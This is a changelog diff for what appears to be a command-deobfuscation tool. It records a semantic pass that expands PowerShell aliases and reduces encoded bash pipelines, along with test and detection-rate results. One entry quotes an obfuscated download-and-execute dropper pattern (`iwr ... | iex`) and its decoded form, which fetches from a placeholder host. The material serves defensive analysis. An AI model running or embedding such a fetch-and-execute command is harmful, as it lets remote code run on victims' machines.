@@ -2,6 +2,65 @@
 
 Chronological record of significant releases (newest first).
 
+## 2026-08-02 · Phase 5.5 · M5 Semantic Pass — COMPLETE · DCS 84.6%
+
+**Ships:**
+- `backend/workspace/convergence/semantic.py` — three
+  deterministic, quote-safe semantic reconstructions:
+    - `semantic-bash-pipeline-reduce` — whitelisted stage evaluator
+      (`rev`, `base64 -d`, `xxd -r -p`, `gunzip`, `rot13`, `tr`,
+      `cat`, `zcat`, `xxd -p`, `base64` encode). Runs FIRST so bash
+      `echo` is not misread as a PS alias.
+    - `semantic-ps-alias-expand` — 9 unambiguous aliases only
+      (`iex`, `iwr`, `icm`, `irm`, `gc`, `gci`, `sc`, `gcm`, `gm`).
+      `echo`/`cat`/`ls`/`dir`/`rm`/`mv`/`cp`/etc. deliberately
+      excluded.
+    - `semantic-ps-variable-propagate` — single-assignment SQ-literal
+      variables only; never touches multi-assigned vars.
+- **S04 anchor fully reconstructs** — `$a='ht'+'tp'+...; iwr $a -useb
+  | iex` → `... Invoke-WebRequest 'http://example.com/x' -useb |
+  Invoke-Expression`. First full end-to-end deobfuscation of a
+  Cobalt-Strike / Empire-style dropper pattern.
+- **Byte-level forensic reports** for S02 and S05 confirm both are
+  corpus-authoring defects (not decoder defects). Evidence archived
+  at `workspace_recovery/S02_FORENSIC_REPORT.txt` and
+  `S05_FORENSIC_REPORT.txt`. Corpus WAS NOT altered to make them
+  pass.
+- Corpus updated for S01, S03: `IEX` → `Invoke-Expression` as
+  canonical form (S08's IEX-in-DQ preserved by quote safety).
+- New tests `backend/tests/test_semantic_pass.py` (22 tests).
+  Combined suite: **160/160 passing in 0.84s**.
+
+**DCS: 11/13 = 84.6%** (+1 sample, +7.7pp vs M4). Cumulative from
+pre-recovery: **+6 samples · +46.1 percentage points**.
+
+Per-category:
+- **PowerShell** 6/7 (S001, S01, S04, S08, S012, S013 pass;
+  S05 remaining is corpus defect · M9)
+- **CMD** 1/1 (S03)
+- **Bash** 2/3 (S07, S10; S02 corpus defect · M9)
+- **Mixed** 2/2 (S06, S09)
+
+**Regressions: 0.**
+- Backend `/api/health` still 200.
+- No changes to `analysis_core.py`, `routers/ops.py`, `engine/`,
+  `v2/`, `timeline/`, or `nivxforge/`.
+- Alias table restricted to unambiguous set — every quote-safety
+  and interpreter-boundary guarantee from M2-M4 preserved.
+
+**Coverage matrix updates** (in `TRANSFORMATION_COVERAGE.md`):
+- `PowerShell aliases (post-decode)` → ✅ implemented (unambiguous
+  whitelist).
+- `Bash pipeline rev / xxd / tr` → ✅ implemented (whitelisted stage
+  evaluator, no shell out).
+
+**Next milestone:** M6 · Canonical Candidate Selection — replace
+`analysis_core.py`'s legacy winner-picker with Convergence-
+Certificate-driven selection. Removes the exact logic that
+originally caused the S001 regression.
+
+---
+
 ## 2026-08-02 · Phase 5.5 · M4 Decoder Pass — COMPLETE · DCS 76.9%
 
 **Ships:**
